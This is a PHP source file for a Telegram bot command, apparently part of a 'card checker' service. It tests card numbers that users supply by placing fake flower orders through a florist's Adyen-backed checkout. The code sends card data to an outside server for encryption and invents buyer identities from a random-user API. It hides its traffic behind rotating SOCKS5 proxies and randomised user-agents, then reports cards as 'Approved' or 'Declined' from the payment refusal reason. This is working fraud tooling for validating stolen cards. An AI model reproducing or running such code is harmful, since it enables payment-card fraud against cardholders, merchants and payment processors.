<?php
$cmd = Command($message);
if (strtolower($cmd['command']) == "za") {  
$data = $cmd['data'];


$NameGater ='Zara';
$gateway = "/za $NameGater";

is_gateroff($NameGater); 
is_premium(); 
deleteprm($userId); 
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

if(empty($data)) $data = $r_msg;
if(empty($data)) $data = $q_msg;



if(empty($data)){
    
$telegram->sendMessage([
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>$NameGater
Format: <code>cc|m|y|cvv</code></b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($data));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
$content = array('chat_id' => $chatId, 'reply_to_message_id' =>$message_id,'parse_mode'=>'HTML', 'text' => "<b>Invalid format</b>");
$telegram->sendMessage($content);
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
$content = array('chat_id' => $chatId, 'reply_to_message_id' =>$message_id,'parse_mode'=>'HTML', 'text' => "b>Bin Banned</b>");
$telegram->sendMessage($content);
die();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";


AntiScript();
is_Antispma($userId, $chatId, $message_id, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = $telegram->sendMessage( [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>ϟ CHECKING YOUR CARD
[ 🝂 WAIT A FEW SECONDS 🟥 ]
Gateway » $NameGater
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"
]);


$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #
$retry = 0;

start:
    
if($retry > 7){
$content = array('chat_id' => $chatId, 'reply_to_message_id' =>$messageidtoedit,'parse_mode'=>'HTML', 'text' => "<b>error proxy</b>");
$telegram->editMessageText($content);die();
}


$rotate = rotate();
$socks5 = socks5();


$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$url = 'https://arturo.alwaysdata.net/adyen/adyen/adyen.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'&key=10001|CA87CBC203343A4726C15A372402D98C9DA112BFEE5F20DE956C0121EDB3A6C1B610E4DA7859C4B40991189F65125BEBCD654816993B34CC2F3B2041984B7C7BB6505E0E222820B6D5E176D749D311222C3279C18650024E6C56C55E67F1629BCE6AD74E5FAAD162CE281D03D842C767E7F0A280F83F2883790B5FE3EE80FB525AD2CC4CCAC0C4AECFF7BF280F094A525BF3A7041267FA9C4B427CBA29A465E4123E7FC30256D7CB0839BE4E531419EE26D980E185A8747201F0CA47EF453411F7D19BF5502C07F70FB397116D2C4363DF4442F03E73B5688AD739014244DD9DACEBC6CD30084696D9207F97052FD5CAD8080251B81D6AE3EC0D059414DFA49D';
$post = file_get_contents($url);
$cc_en = GetStr($post,'"cc":"', '"');
$mes_en = GetStr($post,'"mm":"', '"');
$ano_en = GetStr($post,'"yy":"', '"');
$cvv_en = GetStr($post,'"cvc":"', '"');



$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.foxchaseflora.com/flowers/valentines-day-special-bouquet');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: www.foxchaseflora.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Dnt: 1';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
$referer = GetStr($curl, 'type="hidden" placeholder="referer" name="referer" id="referer" value="', '"');
$account_id = trim(GetStr($curl, 'account_id:', ','));
$a_id = GetStr($curl, 'type="hidden" required placeholder="a_id" value="', '"');

$p_date = date('Y-m-d');
$d_date = date('Y-m-d', strtotime('+9 day'));


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://cart.lovingly.com/orders/multistep?s=standard&a_id=1227603&d_date='.$d_date.'&p_date=&o=valentines&o_type=localdelivery&origin=web&test_value=&test_name=&is_gndl=0&msclkid=&theme=SaveTheRomance&last_visited_category=&referer='.$referer.'&_gl=1*pccp5z*_ga*MTU3Mjg1MTA0LjE3MDc5NDE5NDU.*_ga_4J66CV3XZD*MTcwNzk0MTk0Ni4xLjAuMTcwNzk0MTk0Ni42MC4wLjA.');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: cart.lovingly.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.foxchaseflora.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);

$date2 = microtime(true) * 1000;



function getCreditCardType($ccs) {
    $firstDigit = substr($ccs, 0, 1);

    switch ($firstDigit) {
        case '4':
            return 'visa';
        case '5':
            return 'mc';
        case '3':
            return 'amex';
        case '6':
            return 'discover';
        default:
            return 'unknown';
    }
}

$date = microtime(true) * 1000;
$tm = 33; // Tamaño en bytes de la cadena deseada
$token = bin2hex(random_bytes($tm));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.lovingly.com/v1/orders/web/'.$account_id.'');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.lovingly.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json;charset=utf-8';
$headers[] = 'Origin: https://cart.lovingly.com';
$headers[] = 'Referer: https://cart.lovingly.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"_units":{"distance":"mi"},"payment":{"type":"scheme","gateway":"Adyen","paymentMethod":{"type":"credit"},"last_four":"'.substr($cc, 0, 4).'","postalCode":"13646","street":"Mineral Point Rd","city":"Macomb","stateOrProvince":"NY","houseNumberOrName":"","country":"US","holderName":"'.$firstname.' '.$lastname.'","encryptedCardNumber":"'.$cc_en.'","encryptedExpiryMonth":"'.$mes_en.'","encryptedExpiryYear":"'.$ano_en.'","encryptedSecurityCode":"'.$cvv_en.'","brand":"'.getCreditCardType($cc).'"},"orders":[{"order_destination":"localdelivery","delivery_date":"'.$d_date.'T00:00:00.000Z","card_message":{"occasion":"valentines","message":"","is_agreed":0,"version_date":"2021-03-08"},"order_items":[{"type":"main","name":"Valentine’s Day Special Bouquet","account_product_id":'.$a_id.',"size":"standard","sku":"UFN0896","amount":95.95,"is_virtual":0,"is_21plus":0}],"customer":{"phone":"2323123232","name":"'.$firstname.''.$lastname.'","email":"'.$email.'","optin":1},"customer_address":{"country":"United States","street_1":"Mineral Point Rd","city":"Macomb","state":"NY","postal":"13646"},"origin":"web","recipient":{"name":"'.$firstname.' '.$lastname.'","phone":"2323173842"},"recipient_address":{"street_1":"Mineral Point Rd","city":"Macomb","state":"NY","postal":"13646","address_type":"house","country":"US","room_or_office_number":""},"delivery_distance":0,"delivery_fee":70,"theme":"SaveTheRomance","is_virtual":0,"forterToken":"'.$token.'_'.$date2.'__UDF43-m4_15ck_KchgvRbx8uI=-3899-v2_tt","payment":{},"card_holderName":"'.$firstname.' '.$lastname.'","sameAddress":1,"taxes":[{"amount":10.56,"name":"Sales Tax","rate":0.06}],"regular_service_fee":9.99,"service_fee":9.99,"service_fee_active":1,"sub_total":95.95,"total":186.5,"placedTime":'.$date.',"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0","mainItem":{"type":"main","name":"Valentine’s Day Special Bouquet","account_product_id":'.$a_id.',"product_id":"35143","is_lovingly_fee_free":0,"is_21plus":0,"is_virtual":0,"size":"standard","sku":"UFN0896","amount":95.95,"filename":"k7bpz43tn77rqut9pdsq.png","is_fee_applied":1,"is_taxed":1,"qty":1},"optin":1}]}');
$result2 = curl_exec($ch);
$refusalReason = GetStr($result2 ,'"refusalReason": "','"');
$refusalReasonCode = GetStr($result2 ,'"refusalReasonCode": "','"');
if (empty($refusalReason)) {
        $retry++;
        goto start;
}
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}


$telegram->editMessageText([
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ ALMOST FINISHED 🟩 ]
Gateway » Zara
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);



if ($refusalReason == "CVC Declined"){
$status = "Approved!🟩";
$response = "CVC Declined🟩";
}elseif($refusalReason == "Not enough balance"){
$status = "Approved!🟩";
$response = "Not enough balance🟩";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$refusalReason";
}

   bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card - 🝂 <code>$cc|$mes|$ano|$cvv</code> 
Status - 🝂 $status
Response - 🝂 $response ($refusalReasonCode)
Gateway - 🝂 Zara
－－－－－－－－－－－－－－－－
[ INFO BIN CARD ]
Bin - 🝂 <code>$brand</code> - <code>$scheme</code> - <code>$type</code> 
Bank - 🝂 <code>$bank </code> 
Country - 🝂 <code>$country </code>$emoji 
－－－－－－－－－－－－－－－－
Proxy  - 🝂 Live! ✅ 
Time in Progress - 🝂 $tiempo s
Checked by: <a href='tg://user?id=$userId'>$username</a>[$Rank]
Bot by  - 🝂 Thkss
－－－－－－－－－－－－－－－－</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);

}

?>

